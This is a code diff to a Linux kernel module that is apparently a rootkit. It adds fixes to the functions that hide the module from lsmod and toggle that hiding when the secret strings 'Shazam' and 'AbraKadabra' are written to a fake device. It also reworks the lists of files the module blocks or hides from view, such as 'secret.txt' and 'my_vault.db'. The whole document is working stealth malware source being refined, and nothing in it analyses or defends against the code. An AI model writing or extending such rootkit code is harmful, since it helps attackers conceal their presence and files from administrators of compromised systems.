@@ -5,7 +5,6 @@ MODULE_LICENSE("GPL");
 
 void module_hide(void)
 {
-
 	module_previous = THIS_MODULE->list.prev;
 	list_del(&THIS_MODULE->list);
 	module_hidden = 1;
@@ -35,6 +34,7 @@ ssize_t fake_read (struct file *filp, char __user * buf, size_t count,
 ssize_t fake_write(struct file * filp, const char __user * buf, size_t count,
                                 loff_t * offset)
 {
+	char message[128];
 	memset(message,0,127);
 
 	if(copy_from_user(message,buf,127)!=0)
@@ -42,14 +42,18 @@ ssize_t fake_write(struct file * filp, const char __user * buf, size_t count,
 
 /* if detect the secret string in device input, show module at lsmod. */
     	if(strstr(message,"Shazam")!=NULL)
+	{
+		if(module_hidden==1)
 		{
 			list_add(&THIS_MODULE->list, module_previous);
 			module_hidden = 0;
+		}
      	}
 
 /*	If detect Shazam string in fake device IO turn module invisible to lsmod  */
     	if(strstr(message,"AbraKadabra")!=NULL)
-		{
+	{
+		if(module_hidden==0)
 			module_hide();
      	}
 
@@ -73,10 +77,20 @@ ssize_t fake_write(struct file * filp, const char __user * buf, size_t count,
 
 _Bool check_fs_blocklist(char *input)
 {
-	int total_list = 2,i = 0;
+	int total_list = 0,i = 0;
 	const char *list[] = {
-"backup_httpd.log","secret_img.iso","secret_file.img"
+"backup_httpd.log"
 	};
+        
+        total_list = sizeof(list) / sizeof(list[0]);
+
+	if(fs_protect==0)
+	    return 0;
+
+        if(strlen(list[0]) <= 2)
+	{
+		return 0;
+	}
 
 	while(i!=total_list)
 	{
@@ -90,12 +104,21 @@ _Bool check_fs_blocklist(char *input)
 
 _Bool check_fs_hidelist(char *input)
 {
-	int total_list = 2,i = 0;
+	int total_list = 0,i = 0;
 	const char *list[] = {
 "secret.txt","my_vault.db"
 	};
+
 	if(fs_hidden==0)
 	    return 0;
+
+        total_list = sizeof(list) / sizeof(list[0]);
+
+
+        if(strlen(list[0]) <= 2)
+	{
+		return 0;
+	}
 
 	while(i!=total_list)
 	{
